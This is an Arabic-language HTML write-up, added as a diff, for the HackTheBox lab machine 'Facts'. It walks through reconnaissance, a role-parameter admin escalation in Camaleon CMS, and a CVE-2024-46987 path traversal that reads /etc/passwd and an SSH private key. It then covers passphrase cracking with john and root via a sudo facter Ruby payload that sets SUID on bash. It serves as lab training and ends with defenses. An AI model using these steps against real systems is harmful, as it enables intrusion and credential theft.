@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Facts | شرح كامل</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.8;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            background: linear-gradient(135deg, #161b22, #21262d);
+            border-radius: 12px;
+            border: 1px solid #30363d;
+            margin-bottom: 40px;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            color: #58a6ff;
+            margin-bottom: 10px;
+        }
+
+        .header .subtitle {
+            color: #8b949e;
+            font-size: 1rem;
+        }
+
+        .badges {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .badge-linux { background: #1f6feb; color: white; }
+        .badge-easy { background: #238636; color: white; }
+        .badge-htb { background: #9e6a03; color: white; }
+
+        /* Table of Contents */
+        .toc {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 40px;
+        }
+
+        .toc h2 {
+            color: #58a6ff;
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 10px;
+        }
+
+        .toc ol {
+            padding-right: 20px;
+        }
+
+        .toc li {
+            margin: 8px 0;
+        }
+
+        .toc a {
+            color: #79c0ff;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .toc a:hover {
+            color: #58a6ff;
+            text-decoration: underline;
+        }
+
+        /* Steps */
+        .step {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .step-number {
+            position: absolute;
+            top: -15px;
+            right: 20px;
+            background: #1f6feb;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .step h2 {
+            color: #58a6ff;
+            font-size: 1.4rem;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #21262d;
+        }
+
+        .step h3 {
+            color: #79c0ff;
+            font-size: 1.1rem;
+            margin: 20px 0 10px;
+        }
+
+        .step p {
+            color: #c9d1d9;
+            margin-bottom: 12px;
+        }
+
+        /* Code blocks */
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 15px 0;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block .code-label {
+            position: absolute;
+            top: 8px;
+            left: 12px;
+            color: #8b949e;
+            font-size: 0.75rem;
+            font-family: monospace;
+        }
+
+        .code-block pre {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            color: #e6edf3;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+
+        .code-block .cmd { color: #79c0ff; }
+        .code-block .comment { color: #8b949e; font-style: italic; }
+        .code-block .output { color: #56d364; }
+        .code-block .highlight { color: #ffa657; font-weight: bold; }
+        .code-block .error { color: #f85149; }
+
+        /* Info boxes */
+        .info-box {
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin: 15px 0;
+            border-right: 4px solid;
+        }
+
+        .info-box.why {
+            background: #0d2137;
+            border-color: #1f6feb;
+        }
+
+        .info-box.warning {
+            background: #2d1a00;
+            border-color: #d29922;
+        }
+
+        .info-box.success {
+            background: #0d2d15;
+            border-color: #238636;
+        }
+
+        .info-box.danger {
+            background: #2d0f0f;
+            border-color: #da3633;
+        }
+
+        .info-box .box-title {
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+
+        .info-box.why .box-title { color: #58a6ff; }
+        .info-box.warning .box-title { color: #e3b341; }
+        .info-box.success .box-title { color: #3fb950; }
+        .info-box.danger .box-title { color: #f85149; }
+
+        /* Result box */
+        .result-box {
+            background: #0d2d15;
+            border: 1px solid #238636;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+        }
+
+        .result-box .result-title {
+            color: #3fb950;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .result-box .result-value {
+            color: #56d364;
+            font-family: monospace;
+            font-size: 1rem;
+            margin-top: 5px;
+        }
+
+        /* Attack flow */
+        .attack-flow {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .flow-item {
+            background: #21262d;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 8px 15px;
+            font-size: 0.85rem;
+            color: #c9d1d9;
+            text-align: center;
+        }
+
+        .flow-arrow {
+            color: #58a6ff;
+            font-size: 1.2rem;
+        }
+
+        /* Summary table */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+
+        th {
+            background: #21262d;
+            color: #58a6ff;
+            padding: 12px;
+            text-align: right;
+            border: 1px solid #30363d;
+        }
+
+        td {
+            padding: 10px 12px;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+        }
+
+        tr:nth-child(even) td {
+            background: #161b22;
+        }
+
+        tr:nth-child(odd) td {
+            background: #0d1117;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px;
+            color: #8b949e;
+            border-top: 1px solid #30363d;
+            margin-top: 40px;
+        }
+
+        /* Divider */
+        .divider {
+            height: 1px;
+            background: linear-gradient(to left, transparent, #30363d, transparent);
+            margin: 20px 0;
+        }
+
+        /* highlight inline */
+        code {
+            background: #21262d;
+            color: #ffa657;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+
+        /* CVE badge */
+        .cve-badge {
+            display: inline-block;
+            background: #da3633;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- Header -->
+    <div class="header">
+        <p style="font-size: 1rem; font-weight: bold; color: #79c0ff; margin-bottom: 6px;">Writeup by: joudi janble</p>
+        <h1>🏴 HTB - Facts</h1>
+        <p class="subtitle">شرح كامل ومفصّل لحل ماكينة Facts على منصة HackTheBox</p>
+        <div class="badges">
+            <span class="badge badge-linux">Linux</span>
+            <span class="badge badge-htb">HackTheBox</span>
+            <span class="badge badge-easy">Camaleon CMS</span>
+        </div>
+    </div>
+
+    <!-- Summary Table -->
+    <div class="step">
+        <h2>📋 معلومات الماكينة</h2>
+        <table>
+            <tr><th>العنصر</th><th>التفاصيل</th></tr>
+            <tr><td>اسم الماكينة</td><td>Facts</td></tr>
+            <tr><td>نظام التشغيل</td><td>Linux (Ubuntu)</td></tr>
+            <tr><td>المنافذ المفتوحة</td><td>22 (SSH), 80 (HTTP)</td></tr>
+            <tr><td>التقنية المستخدمة</td><td>Camaleon CMS</td></tr>
+            <tr><td>الثغرة الرئيسية</td><td>CVE-2024-46987 (Path Traversal)</td></tr>
+            <tr><td>رفع الصلاحيات</td><td>facter + GTFOBins</td></tr>
+        </table>
+    </div>
+
+    <!-- Table of Contents -->
+    <div class="toc">
+        <h2>📑 فهرس الخطوات</h2>
+        <ol>
+            <li><a href="#step1">استكشاف المنافذ - Nmap</a></li>
+            <li><a href="#step2">مسح المسارات - Feroxbuster</a></li>
+            <li><a href="#step3">اكتشاف Camaleon CMS والدخول للإدارة</a></li>
+            <li><a href="#step4">استغلال CVE-2024-46987 (Path Traversal)</a></li>
+            <li><a href="#step5">قراءة /etc/passwd لمعرفة المستخدمين</a></li>
+            <li><a href="#step6">سرقة مفتاح SSH الخاص</a></li>
+            <li><a href="#step7">كسر كلمة مرور المفتاح - ssh2john</a></li>
+            <li><a href="#step8">الدخول عبر SSH</a></li>
+            <li><a href="#step9">رفع الصلاحيات إلى Root</a></li>
+            <li><a href="#step10">قراءة الـ Flags</a></li>
+        </ol>
+    </div>
+
+    <!-- Step 1: Nmap -->
+    <div class="step" id="step1">
+        <div class="step-number">1</div>
+        <h2>🔍 استكشاف المنافذ - Nmap</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 لماذا نبدأ بـ Nmap؟</div>
+            <p>أول خطوة في أي اختبار اختراق هي معرفة ما هو مفتوح على الجهاز المستهدف. Nmap هو أداة تفحص المنافذ وتخبرك بالخدمات الشغّالة على الجهاز وإصداراتها.</p>
+        </div>
+
+        <div class="code-block">
+            <div class="code-label">bash</div>
+            <pre><span class="cmd">nmap facts.htb -A</span>
+
+<span class="comment"># -A تعني: فحص شامل (إصدارات، سكريبتات، نظام التشغيل)</span></pre>
+        </div>
+
+        <h3>النتيجة:</h3>
+        <div class="code-block">
+            <pre><span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
+80/tcp open  http    nginx 1.26.3 (Ubuntu)</span></pre>
+        </div>
+
+        <div class="info-box success">
+            <div class="box-title">✅ ماذا فهمنا؟</div>
+            <p>
+                <strong>منفذ 22:</strong> SSH مفتوح - يمكن الدخول عبره إذا حصلنا على بيانات اعتماد<br>
+                <strong>منفذ 80:</strong> HTTP مفتوح - يعني في موقع ويب نقدر نفحصه
+            </p>
+        </div>
+
+        <div class="info-box warning">
+            <div class="box-title">⚠️ ملاحظة مهمة</div>
+            <p>قبل البدء، تأكد من إضافة الجهاز في ملف <code>/etc/hosts</code> حتى يتعرف النظام على اسم النطاق:</p>
+        </div>
+
+        <div class="code-block">
+            <pre><span class="cmd">echo "10.129.37.124 facts.htb" | sudo tee -a /etc/hosts</span></pre>
+        </div>
+    </div>
+
+    <!-- Step 2: Feroxbuster -->
+    <div class="step" id="step2">
+        <div class="step-number">2</div>
+        <h2>📂 مسح المسارات - Feroxbuster</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 لماذا نستخدم Feroxbuster؟</div>
+            <p>الموقع قد يحتوي على صفحات وملفات مخفية غير ظاهرة في الواجهة العادية. Feroxbuster يجرب آلاف المسارات المحتملة ويخبرنا أيها موجود فعلاً.</p>
+        </div>
+
+        <div class="code-block">
+            <div class="code-label">bash</div>
+            <pre><span class="cmd">feroxbuster -u 'http://facts.htb/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+
+<span class="comment"># -u  : الرابط المستهدف
+# -w  : قائمة الكلمات (قاموس المسارات المحتملة)</span></pre>
+        </div>
+
+        <h3>أهم النتائج:</h3>
+        <div class="code-block">
+            <pre><span class="output">200 GET  http://facts.htb/
+200 GET  http://facts.htb/sitemap
+200 GET  http://facts.htb/search
+</span><span class="highlight">302 GET  http://facts.htb/admin => http://facts.htb/admin/login</span></pre>
+        </div>
+
+        <div class="info-box success">
+            <div class="box-title">✅ الاكتشاف المهم</div>
+            <p>وجدنا مسار <code>/admin</code> الذي يعيد التوجيه إلى صفحة تسجيل الدخول للإدارة. هذا هدفنا القادم!</p>
+        </div>
+    </div>
+
+    <!-- Step 3: Camaleon CMS -->
+    <div class="step" id="step3">
+        <div class="step-number">3</div>
+        <h2>🖥️ اكتشاف Camaleon CMS والدخول للإدارة</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 ما هو Camaleon CMS؟</div>
+            <p>Camaleon CMS هو نظام إدارة محتوى مبني على Ruby on Rails. اكتشفنا من ملفات CSS و JS في نتائج Feroxbuster أن الموقع يستخدم هذا النظام بالإصدار 2.x.</p>
+        </div>
+
+        <h3>الخطوات:</h3>
+        <p><strong>1.</strong> افتح المتصفح واذهب إلى: <code>http://facts.htb/admin/login</code></p>
+        <p><strong>2.</strong> سجّل حساب جديد من صفحة التسجيل العادية</p>
+        <p><strong>3.</strong> سجّل دخول بالحساب الجديد</p>
+        <p><strong>4.</strong> اذهب لإعدادات تغيير كلمة المرور وافتح Burp Suite لاصطياد الطلب</p>
+
+        <div class="info-box warning">
+            <div class="box-title">⚠️ ثغرة في تغيير الصلاحيات</div>
+            <p>في طلب تغيير كلمة المرور، أضف المعامل <code>role=admin</code> في البيانات المرسلة. هذا يسمح لك بالدخول كمدير بسبب عدم التحقق الصحيح من الصلاحيات.</p>
+        </div>
+
+        <div class="code-block">
+            <div class="code-label">Burp Suite - Request Body</div>
+            <pre><span class="highlight">user[role]=admin&user[password]=newpassword&user[password_confirmation]=newpassword</span></pre>
+        </div>
+
+        <p>بعد إرسال الطلب، سجّل دخول مرة أخرى وستكون الآن <strong>مدير (Admin)</strong> على لوحة التحكم.</p>
+    </div>
+
+    <!-- Step 4: CVE-2024-46987 -->
+    <div class="step" id="step4">
+        <div class="step-number">4</div>
+        <h2>⚡ استغلال <span class="cve-badge">CVE-2024-46987</span> Path Traversal</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 ما هي هذه الثغرة؟</div>
+            <p>
+                <strong>CVE-2024-46987</strong> هي ثغرة <em>Path Traversal</em> في Camaleon CMS الإصدار 2.8.0 حتى 2.8.2.<br><br>
+                <strong>Path Traversal</strong> تعني: إمكانية قراءة ملفات خارج المسار المسموح به عبر استخدام <code>../</code> للتنقل بين المجلدات.<br><br>
+                مثال: بدلاً من قراءة <code>/uploads/photo.jpg</code>، يقدر المهاجم يقرأ <code>/etc/passwd</code> أو أي ملف آخر على الجهاز.
+            </p>
+        </div>
+
+        <div class="info-box warning">
+            <div class="box-title">⚠️ شرط الاستغلال</div>
+            <p>هذه الثغرة تحتاج <strong>مستخدم مسجّل</strong> على الموقع (authenticated). لهذا سجّلنا حساباً في الخطوة السابقة.</p>
+        </div>
+
+        <h3>تحميل السكريبت:</h3>
+        <div class="code-block">
+            <pre><span class="cmd">git clone https://github.com/Goultarde/CVE-2024-46987</span>
+<span class="cmd">cd CVE-2024-46987</span></pre>
+        </div>
+
+        <h3>طريقة الاستخدام:</h3>
+        <div class="code-block">
+            <div class="code-label">bash</div>
+            <pre><span class="cmd">python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh [مسار الملف]</span>
+
+<span class="comment"># -u    : رابط الموقع
+# --user: اسم المستخدم الذي سجّلناه
+# -p    : كلمة مرور المستخدم
+# [مسار]: الملف الذي نريد قراءته</span></pre>
+        </div>
+    </div>
+
+    <!-- Step 5: /etc/passwd -->
+    <div class="step" id="step5">
+        <div class="step-number">5</div>
+        <h2>👥 قراءة /etc/passwd لمعرفة المستخدمين</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 لماذا نقرأ /etc/passwd؟</div>
+            <p>
+                ملف <code>/etc/passwd</code> يحتوي على قائمة <strong>كل المستخدمين</strong> في النظام. هذا يساعدنا على معرفة أسماء المستخدمين الذين قد يكون لديهم ملفات مهمة مثل مفاتيح SSH.
+            </p>
+        </div>
+
+        <div class="code-block">
+            <div class="code-label">bash</div>
+            <pre><span class="cmd">python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /etc/passwd</span></pre>
+        </div>
+
+        <h3>جزء من النتيجة:</h3>
+        <div class="code-block">
+            <pre><span class="output">root:x:0:0:root:/root:/bin/bash
+...
+</span><span class="highlight">william:x:1000:1000::/home/william:/bin/bash
+trivia:x:1001:1001::/home/trivia:/bin/bash</span></pre>
+        </div>
+
+        <div class="info-box success">
+            <div class="box-title">✅ ماذا اكتشفنا؟</div>
+            <p>
+                يوجد مستخدمان مهمان:<br>
+                - <code>william</code> - المستخدم الرئيسي (home: /home/william)<br>
+                - <code>trivia</code> - مستخدم آخر (home: /home/trivia)<br><br>
+                الخطوة التالية: نحاول نسرق مفاتيح SSH لأحدهم.
+            </p>
+        </div>
+    </div>
+
+    <!-- Step 6: SSH Key -->
+    <div class="step" id="step6">
+        <div class="step-number">6</div>
+        <h2>🔑 سرقة مفتاح SSH الخاص</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 ما هو مفتاح SSH الخاص؟</div>
+            <p>
+                بدلاً من كلمة المرور، SSH يسمح بالدخول عبر <strong>زوج مفاتيح</strong>:<br>
+                - <strong>المفتاح العام</strong> (public): موجود على الجهاز المستهدف<br>
+                - <strong>المفتاح الخاص</strong> (private): موجود عند المستخدم<br><br>
+                إذا حصلنا على المفتاح الخاص، نقدر ننتحل هوية المستخدم والدخول بدون كلمة مرور.
+            </p>
+        </div>
+
+        <div class="info-box why">
+            <div class="box-title">💡 لماذا المسار ثابت دائماً؟</div>
+            <p>
+                في Linux، مفاتيح SSH دائماً تكون في نفس المكان بالاتفاقية القياسية:<br>
+                <code>/home/[اسم المستخدم]/.ssh/id_ed25519</code><br>
+                <code>/home/[اسم المستخدم]/.ssh/id_rsa</code><br><br>
+                هذا معيار Linux ثابت، ولهذا نعرف أين نبحث مباشرةً.
+            </p>
+        </div>
+
+        <h3>جربنا مستخدم william أولاً:</h3>
+        <div class="code-block">
+            <pre><span class="cmd">python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /home/william/.ssh/id_ed25519</span>
+<span class="error"># لم يتم العثور على الملف</span></pre>
+        </div>
+
+        <h3>ثم جربنا مستخدم trivia:</h3>
+        <div class="code-block">
+            <pre><span class="cmd">python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /home/trivia/.ssh/id_ed25519</span>
+
+<span class="output">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAA...
+...
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+        </div>
+
+        <div class="info-box success">
+            <div class="box-title">✅ نجحنا! حصلنا على المفتاح</div>
+            <p>تمكّنا من قراءة المفتاح الخاص لمستخدم <code>trivia</code>. الخطوة التالية هي استخدامه للدخول عبر SSH.</p>
+        </div>
+
+        <h3>احفظ المفتاح في ملف:</h3>
+        <div class="code-block">
+            <pre><span class="cmd">nano id_ed25519</span>
+<span class="comment"># الصق محتوى المفتاح كاملاً بما فيه BEGIN و END</span>
+
+<span class="comment"># أو مباشرة من السكريبت:</span>
+<span class="cmd">python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /home/trivia/.ssh/id_ed25519 > id_ed25519</span></pre>
+        </div>
+    </div>
+
+    <!-- Step 7: ssh2john -->
+    <div class="step" id="step7">
+        <div class="step-number">7</div>
+        <h2>🔓 كسر كلمة مرور المفتاح - ssh2john</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 لماذا نحتاج ssh2john؟</div>
+            <p>
+                المفتاح الخاص محمي بـ <strong>passphrase</strong> (كلمة مرور إضافية للمفتاح نفسه). عند محاولة الاتصال سيطلب منك هذه الكلمة.<br><br>
+                <code>ssh2john</code> يحوّل المفتاح إلى صيغة يفهمها برنامج <code>john</code> لكسر كلمات المرور عبر القاموس.
+            </p>
+        </div>
+
+        <h3>الخطوة 1: ضبط صلاحيات الملف (مهم جداً!)</h3>
+        <div class="code-block">
+            <pre><span class="cmd">chmod 600 id_ed25519</span>
+
+<span class="comment"># لماذا؟ SSH يرفض المفتاح إذا كان مقروءاً من قِبل مستخدمين آخرين
+# 600 = القراءة والكتابة للمالك فقط</span></pre>
+        </div>
+
+        <h3>الخطوة 2: تحويل المفتاح لصيغة john</h3>
+        <div class="code-block">
+            <pre><span class="cmd">ssh2john id_ed25519 > ssh.hash</span>
+
+<span class="comment"># ssh2john يستخرج الهاش من المفتاح ويضعه في ملف ssh.hash</span></pre>
+        </div>
+
+        <h3>الخطوة 3: كسر الهاش بالقاموس</h3>
+        <div class="code-block">
+            <pre><span class="cmd">john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt</span>
+
+<span class="comment"># john   : برنامج كسر كلمات المرور
+# --wordlist: قاموس كلمات المرور الشائعة (rockyou يحتوي 14 مليون كلمة)</span></pre>
+        </div>
+
+        <div class="info-box warning">
+            <div class="box-title">⚠️ إذا ما وجدت rockyou.txt</div>
+            <p>فك الضغط عنه أولاً: <code>gunzip /usr/share/wordlists/rockyou.txt.gz</code></p>
+        </div>
+
+        <h3>النتيجة:</h3>
+        <div class="code-block">
+            <pre><span class="output">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+</span><span class="highlight">dragonballz      (id_ed25519)</span>
+<span class="output">1g 0:00:01:04 DONE (2026-02-04 19:35) 0.01557g/s 49.84p/s</span></pre>
+        </div>
+
+        <div class="result-box">
+            <div class="result-title">🎯 كلمة مرور المفتاح</div>
+            <div class="result-value">dragonballz</div>
+        </div>
+    </div>
+
+    <!-- Step 8: SSH Login -->
+    <div class="step" id="step8">
+        <div class="step-number">8</div>
+        <h2>🚪 الدخول عبر SSH</h2>
+
+        <div class="code-block">
+            <div class="code-label">bash</div>
+            <pre><span class="cmd">ssh -i id_ed25519 trivia@10.129.37.124</span>
+
+<span class="comment"># -i : استخدم هذا المفتاح للمصادقة
+# trivia : اسم المستخدم
+# 10.129.37.124 : IP الجهاز</span>
+
+<span class="comment"># عند السؤال:</span>
+<span class="output">Enter passphrase for key 'id_ed25519': </span><span class="highlight">dragonballz</span></pre>
+        </div>
+
+        <div class="info-box success">
+            <div class="box-title">✅ دخلنا بنجاح!</div>
+            <p>أصبحنا داخل الجهاز بمستخدم <code>trivia</code>. الآن نبحث عن طريقة للوصول إلى صلاحيات root.</p>
+        </div>
+
+        <h3>اقرأ user.txt:</h3>
+        <div class="code-block">
+            <pre><span class="cmd">cat /home/william/user.txt</span>
+<span class="output">HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</span></pre>
+        </div>
+    </div>
+
+    <!-- Step 9: Privilege Escalation -->
+    <div class="step" id="step9">
+        <div class="step-number">9</div>
+        <h2>⬆️ رفع الصلاحيات إلى Root</h2>
+
+        <div class="info-box why">
+            <div class="box-title">💡 ما معنى رفع الصلاحيات؟</div>
+            <p>
+                نحن الآن داخل الجهاز بمستخدم عادي (<code>trivia</code>). للحصول على صلاحيات كاملة على الجهاز، نحتاج نصبح <code>root</code>. هذه العملية تسمى <em>Privilege Escalation</em>.
+            </p>
+        </div>
+
+        <h3>الخطوة 1: تحقق من sudo</h3>
+        <div class="code-block">
+            <pre><span class="cmd">sudo -l</span>
+
+<span class="comment"># هذا الأمر يعرض ما يمكن لمستخدمنا تشغيله بصلاحيات root</span></pre>
+        </div>
+
+        <h3>النتيجة:</h3>
+        <div class="code-block">
+            <pre><span class="output">User trivia may run the following commands on facts:
+</span><span class="highlight">    (ALL) NOPASSWD: /usr/bin/facter</span></pre>
+        </div>
+
+        <div class="info-box why">
+            <div class="box-title">💡 ما هو facter؟</div>
+            <p>
+                <code>facter</code> هو برنامج مكتوب بلغة Ruby يجمع معلومات عن النظام. <br>
+                <strong>المشكلة:</strong> يدعم تشغيل ملفات Ruby مخصصة عبر <code>--custom-dir</code>، مما يعني أننا نقدر نجعله يشغّل كود Ruby خاص بنا <strong>بصلاحيات root!</strong>
+            </p>
+        </div>
+
+        <div class="info-box warning">
+            <div class="box-title">⚠️ GTFOBins</div>
+            <p>موقع <strong>GTFOBins</strong> هو مرجع يحتوي على طرق استغلال البرامج الشائعة في Linux لرفع الصلاحيات. وجدنا فيه طريقة استغلال <code>facter</code>.</p>
+        </div>
+
+        <h3>الخطوة 2: إنشاء ملف Ruby الخبيث</h3>
+        <div class="code-block">
+            <pre><span class="cmd">mkdir -p /tmp/exploit_facts</span>
+<span class="cmd">cat > /tmp/exploit_facts/exploit.rb << 'EOF'
+system("chmod +s /bin/bash")
+EOF</span>
+
+<span class="comment"># شرح الكود:
+# chmod +s /bin/bash  = إضافة صلاحية SUID لـ bash
+# SUID تعني: عند تشغيل bash، تشتغل بصلاحيات مالكها (root)</span></pre>
+        </div>
+
+        <h3>الخطوة 3: تشغيل facter بصلاحيات root</h3>
+        <div class="code-block">
+            <pre><span class="cmd">sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x</span>
+
+<span class="comment"># --custom-dir : اقرأ ملفات Ruby من هذا المجلد
+# sudo         : شغّله بصلاحيات root</span></pre>
+        </div>
+
+        <h3>الخطوة 4: تحقق من نجاح العملية</h3>
+        <div class="code-block">
+            <pre><span class="cmd">ls -al /bin/bash</span>
+<span class="highlight">-rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash</span>
+
+<span class="comment"># الـ 's' في الصلاحيات = SUID فعّال ✓</span></pre>
+        </div>
+
+        <h3>الخطوة 5: احصل على shell بصلاحيات root</h3>
+        <div class="code-block">
+            <pre><span class="cmd">bash -p</span>
+
+<span class="comment"># -p : استخدم صلاحيات المالك (root) بدلاً من المستخدم الحالي</span>
+
+<span class="output">bash-5.2# whoami</span>
+<span class="highlight">root</span></pre>
+        </div>
+
+        <div class="info-box success">
+            <div class="box-title">✅ أصبحنا root!</div>
+            <p>حصلنا على صلاحيات كاملة على الجهاز.</p>
+        </div>
+    </div>
+
+    <!-- Step 10: Flags -->
+    <div class="step" id="step10">
+        <div class="step-number">10</div>
+        <h2>🏁 قراءة الـ Flags</h2>
+
+        <h3>User Flag:</h3>
+        <div class="code-block">
+            <pre><span class="cmd">cat /home/william/user.txt</span>
+<span class="highlight">HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</span></pre>
+        </div>
+
+        <h3>Root Flag:</h3>
+        <div class="code-block">
+            <pre><span class="cmd">cat /root/root.txt</span>
+<span class="highlight">HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</span></pre>
+        </div>
+
+        <div class="result-box">
+            <div class="result-title">🎉 تم حل الماكينة بنجاح!</div>
+        </div>
+    </div>
+
+    <!-- Attack Flow Summary -->
+    <div class="step">
+        <h2>🗺️ ملخص مسار الهجوم</h2>
+        <div class="attack-flow">
+            <div class="flow-item">🔍 Nmap<br>اكتشاف المنافذ</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">📂 Feroxbuster<br>اكتشاف /admin</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">🖥️ Camaleon CMS<br>دخول الإدارة</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">⚡ CVE-2024-46987<br>Path Traversal</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">👥 /etc/passwd<br>اكتشاف المستخدمين</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">🔑 SSH Key<br>سرقة المفتاح</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">🔓 ssh2john<br>كسر الـ passphrase</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">🚪 SSH Login<br>دخول كـ trivia</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">⬆️ facter<br>رفع الصلاحيات</div>
+            <div class="flow-arrow">←</div>
+            <div class="flow-item">👑 ROOT<br>🏁 Flag</div>
+        </div>
+    </div>
+
+    <!-- Lessons Learned -->
+    <div class="step">
+        <h2>📚 الدروس المستفادة</h2>
+        <table>
+            <tr>
+                <th>الثغرة</th>
+                <th>الدرس</th>
+                <th>الحماية</th>
+            </tr>
+            <tr>
+                <td>تسجيل مستخدم عادي يصبح admin</td>
+                <td>عدم التحقق من الصلاحيات في الـ API</td>
+                <td>التحقق من صلاحيات المستخدم في كل طلب</td>
+            </tr>
+            <tr>
+                <td>CVE-2024-46987 Path Traversal</td>
+                <td>قراءة ملفات خارج المسار المسموح</td>
+                <td>تحديث Camaleon CMS وتعقيم المدخلات</td>
+            </tr>
+            <tr>
+                <td>مفتاح SSH بكلمة مرور ضعيفة</td>
+                <td>dragonballz في قاموس rockyou</td>
+                <td>استخدام كلمات مرور قوية وعشوائية</td>
+            </tr>
+            <tr>
+                <td>facter بصلاحيات sudo</td>
+                <td>تشغيل كود Ruby كـ root</td>
+                <td>تجنب إعطاء sudo لأدوات تشغّل كوداً</td>
+            </tr>
+        </table>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>HTB - Facts | شرح تعليمي لأغراض اختبار الاختراق القانوني فقط</p>
+        <p style="margin-top: 8px; font-size: 0.85rem;">HackTheBox - بيئة تعليمية قانونية 100%</p>
+    </div>
+
+</div>
+</body>
+</html>
